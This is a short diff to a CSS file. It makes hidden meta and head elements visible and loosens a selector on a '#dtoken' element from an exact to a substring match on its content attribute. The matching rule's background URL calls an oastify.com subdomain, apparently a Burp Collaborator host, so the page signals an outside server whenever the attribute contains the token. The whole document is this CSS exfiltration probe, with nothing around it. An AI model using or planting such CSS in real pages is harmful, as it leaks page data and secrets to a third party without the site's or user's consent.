@@ -2,7 +2,7 @@ meta, head {
     display: block;
 }
 
-#dtoken[content="6bc48aff226942ad"]{
+#dtoken[content*="6bc48aff226942ad"]{
     background: url(https://6bc48aff226942ad.ub9zh3mc3n9m727mpuwd8bh0krqieh26.oastify.com/);
 }
 
